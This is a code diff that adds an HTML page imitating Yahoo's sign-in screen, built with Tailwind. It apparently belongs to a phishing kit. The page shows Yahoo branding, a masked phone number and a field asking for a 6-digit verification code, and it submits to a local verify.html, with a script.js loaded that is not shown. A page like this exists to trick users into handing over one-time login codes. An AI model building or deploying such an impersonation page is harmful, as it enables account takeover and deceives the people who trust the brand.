@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" sizes="32x32" href="src/favicon-32x32.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="src/apple-touch-icon.png">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="script.js" type="module" defer></script>
+    <title>Verity to Signin | yahoo.com</title>
+    
+    <style>
+      :root {
+        --primary-clr-500: hsl(263, 100%, 59%);
+        --primary-clr-hover: hsl(263, 95%, 42%);
+      }
+
+      .custom-checkbox input[type="checkbox"] {
+        -webkit-appearance: none;
+        appearance: none;
+        width: 20px;
+        height: 20px;
+        border: 1px solid var(--primary-clr-hover); /* gray-300 */
+        border-radius: 0.25rem;
+        background: #fff;
+        display: inline-block;
+        vertical-align: middle;
+        position: relative;
+      }
+      .custom-checkbox input[type="checkbox"]:checked {
+        background-color: var(--primary-clr-500); /* brand purple */
+        border-color: var(--primary-clr-500);
+        background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffffff' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'><path d='M20 6L9 17l-5-5'/></svg>");
+        background-repeat: no-repeat;
+        background-position: center;
+        background-size: 60% 60%;
+      }
+      .custom-checkbox input[type="checkbox"]:focus {
+        outline: none;
+        box-shadow: 0 0 0 4px rgba(91, 0, 230, 0.12);
+      }
+
+      input::placeholder,
+      input::-webkit-input-placeholder,
+      input::-moz-placeholder {
+        color: red;
+        font-size: 3rem;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Page wrapper -->
+    <div>
+      <!-- Top navigation / brand -->
+      <!-- ! media query here! -->
+      <header class="hidden lg:flex items-center justify-between py-8 px-12 text-xs text-purple-600">
+        <img class="w-[7rem] h-auto" src="src/yahoo logo.png" alt="Yahoo" />
+        <nav>
+          <ul class="flex space-x-4">
+            <li><a href="#">Help</a></li>
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Privacy</a></li>
+          </ul>
+        </nav>
+      </header>
+
+      <main class="pt-2">
+        <!-- ! media query here! -->
+        <div class="lg:grid lg:grid-cols-[1fr_22.5rem] lg:gap-4 lg:w-[min(calc(100%-4rem),_64.5rem)] w-[calc(100%_-_1rem)] mx-auto">
+          <!-- Left hero/text area -->
+          <!-- ! media query here! -->
+          <section class="hidden lg:block grow-2 mt-10">
+            <strong class="text-xl mb-4 inline-block">Yahoo makes it easy to enjoy what matters most in your world.</strong>
+            <p class="text-[1.3rem] leading-tight">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
+          </section>
+
+          <!-- Right sign-in card -->
+          <aside>
+            <!-- ! media query here! -->
+            <div class="sm:w-[min(100%,_22.5rem)] sm:px-2 md:mt-0 md:shadow-[0_0_3px_rgba(0,0,0,0.2)] mt-20 w-full mx-auto rounded-xl pt-6 pb-14">
+              <img class="w-[5rem] mx-auto" src="src/yahoo logo.png" alt="Yahoo icon" />
+
+              <form action="verify.html" method="get">
+                <!-- STEP ONE -->
+                <div id="step-one" class="hiddens">
+                  <div class="mx-auto flex flex-col items-center mb-10 mt-[2rem]">
+                    <p id="verify-username-display" class="mb-4">Sign in using your Yahoo account</p>
+                    <strong class="text-2xl mb-1 block">Enter verification code</strong>
+                    <!-- prettier-ignore -->
+                    <p>You'll get a text on <span class="font-semibold">(9<sup>**</sup>)<sup>***-**</sup>**</span></p>
+                  </div>
+
+                  <div class="mx-[1.5rem]">
+                    <div class="mb-4">
+                      <label class="text-sm" for="number">6-digit code</label>
+                      <input id="verify-code" class="border-b border-gray-600 w-full px-2 py-2 mt-1 focus:outline-none focus:border-b-[var(--primary-clr-hover)] transition-colors duration-150 rounded-none appearance-none" name="number" type="text" inputmode="numeric" maxlength="6" placeholder="------" />
+                      <span id="verify-error-alert" class="text-red-500 text-xs hidden">Please provide a verification code.</span>
+                    </div>
+
+                    <button class="w-full bg-[var(--primary-clr-500)] font-semibold text-white px-2 py-2 mt-2 rounded-[10rem] || hover:bg-[var(--primary-clr-hover)] focus:bg-[var(--primary-clr-hover)] focus:outline-none transition-colors duration-150" type="button">Next</button>
+
+                    <div class="flex justify-between items-center text-sm mt-4 mb-6">
+                      <label class="inline-flex items-center gap-3 text-sm text-neutral-700 custom-checkbox">
+                        <input type="checkbox" name="stay" />
+                        <span class="select-none">Stay verified</span>
+                      </label>
+                    </div>
+
+                    <a class="text-[var(--primary-clr-500)] block text-center text-sm font-semibold mb-4 || hover:text-[var(--primary-clr-hover)] focus:text-[var(--primary-clr-hover)] focus:outline-none transition-colors duration-150" href="#">Resend code</a>
+
+                    <a class="text-[var(--primary-clr-500)] block text-center text-sm font-semibold || hover:text-[var(--primary-clr-hover)] focus:text-[var(--primary-clr-hover)] focus:outline-none transition-colors duration-150" href="#">Try signing in another way</a>
+                  </div>
+                </div>
+              </form>
+            </div>
+          </aside>
+        </div>
+      </main>
+    </div>
+  </body>
+</html>
